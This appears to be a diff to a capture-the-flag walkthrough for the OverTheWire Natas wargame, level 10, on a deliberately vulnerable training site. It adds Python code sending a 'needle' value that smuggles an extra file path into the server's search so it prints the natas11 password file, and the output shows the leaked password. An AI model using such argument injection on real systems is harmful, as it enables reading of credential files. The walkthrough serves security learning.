@@ -357,11 +357,28 @@ https://overthewire.org/wargames/natas/natas10.html
 > URL:      http://natas10.natas.labs.overthewire.org
 
 ```python
+natas = natasX
+
+# print(natas.natasX(10, "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu").text)
+print(natas.natasX(10, "nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu", endpoint="/?needle=u /etc/natas_webpass/natas11").text)
 ```
 
 **Output**
 
 ```html
+Output:
+<pre>
+/etc/natas_webpass/natas11:U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK
+dictionary.txt:August
+dictionary.txt:August's
+dictionary.txt:Augusts
+dictionary.txt:Celsius
+dictionary.txt:Celsiuses
+dictionary.txt:Dutch
+dictionary.txt:Dutch's
+dictionary.txt:Europe
+<!-- [...] -->
+</pre>
 ```
 
 ## Natas11
